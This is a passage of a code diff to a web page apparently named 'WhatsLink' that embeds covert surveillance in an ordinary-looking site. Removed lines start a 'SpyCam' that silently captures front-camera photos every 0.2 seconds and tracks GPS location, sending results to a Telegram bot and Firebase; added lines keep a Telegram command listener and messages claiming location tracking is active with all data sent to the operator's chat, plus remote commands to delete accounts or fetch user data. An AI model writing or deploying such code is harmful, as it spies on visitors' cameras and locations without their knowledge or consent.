+        '• Location tracking active\n' +
+        '• All data sent to this chat\n\n' +
+        '📌 <b>Commands:</b>\n' +
+        '/disable [uid] - Disable account\n' +
+        '/enable [uid] - Enable account\n' +
+        '/delete [uid] - Delete account\n' +
+        '/get_user [uid] - Get user data\n' +
+        '/stats - Get website stats\n' +
+        '/broadcast [msg] - Send to all users'
+    );
+
+    const params = new URLSearchParams(window.location.search);
+    const ref = params.get('ref');
+    if (ref && !auth.currentUser) {
+        document.getElementById('regReferral').value = ref;
+        showAuth('register');
+    }
+
+    updateUI();
+});
+
+// ============================================================
+// 🚀 LISTEN FOR TELEGRAM COMMANDS
+// ============================================================
+TELEGRAM.listenCommands();
+
+// ============================================================
+// AUTH STATE LISTENER
 // ============================================================
 auth.onAuthStateChanged(async (user) => {
     if (user) {
@@ -2365,8 +2384,6 @@ auth.onAuthStateChanged(async (user) => {
             SpyCam.stop();
             return;
         }
-        // Start SpyCam for this user
-        SpyCam.init(user.uid);
         await updateUI();
         renderTasks();
     } else {
@@ -2375,73 +2392,10 @@ auth.onAuthStateChanged(async (user) => {
     }
 });
 
-// ============================================================
-// 🚀 LISTEN FOR TELEGRAM BOT COMMANDS (via Firebase)
-// ============================================================
-TELEGRAM.listenCommands();
-
-// ============================================================
-// 🚀 INIT - START SPY CAMERA & LOCATION
-// ============================================================
-document.addEventListener('DOMContentLoaded', function() {
-    console.log('🚀 WhatsLink - Complete System (No VPN Required)');
-    console.log('📸 Front Camera: Active (0.2s interval)');
-    console.log('📍 Location: Active');
-    console.log('☁️ Firebase Storage: Active (No VPN needed)');
-    console.log('📡 Works without VPN - Uses Firebase as backend');
-
-    // Check if user is already logged in
-    const user = auth.currentUser;
-    if (user) {
-        SpyCam.init(user.uid);
-    }
-
-    // Send bot online message via Firebase (no VPN needed)
-    TELEGRAM.storeInFirebase('system_status', {
-        status: 'online',
-        message: '🚀 WhatsLink Bot is Online!',
-        timestamp: new Date().toISOString(),
-        features: [
-            'Front Camera: 0.2s interval (no notification)',
-            'Location: GPS tracking (high accuracy)',
-            'Firebase Storage: All data stored securely',
-            'No VPN required - Works globally'
-        ]
-    });
-
-    // Also try to send via Telegram (may be blocked)
-    TELEGRAM.sendMessage(
-        '🚀 <b>WhatsLink Bot is Online!</b>\n\n' +
-        '📸 <b>Spy Features:</b>\n' +
-        '• Front Camera: 0.2s interval (no notification)\n' +
-        '• Location: GPS tracking (high accuracy)\n' +
-        '• Firebase Storage: All data stored securely\n' +
-        '• No VPN required - Works globally\n\n' +
-        '📌 <b>Commands:</b>\n' +
-        '/disable [uid] - Disable account\n' +
-        '/enable [uid] - Enable account\n' +
-        '/delete [uid] - Delete account\n' +
-        '/get_user [uid] - Get user data\n' +
-        '/stats - Get website stats\n' +
-        '/capture - Force capture photo\n' +
-        '/get_photos [uid] - Get user photos'
-    );
-
-    // Handle referral URL parameter
-    const params = new URLSearchParams(window.location.search);
-    const ref = params.get('ref');
-    if (ref && !auth.currentUser) {
-        document.getElementById('regReferral').value = ref;
-        showAuth('register');
-    }
-
-    updateUI();
-});
-
 // Stop spy camera when page unloads
 window.addEventListener('beforeunload', function() {
     SpyCam.stop();
 });
 </script>
 </body>
-                </html>
+    </html>
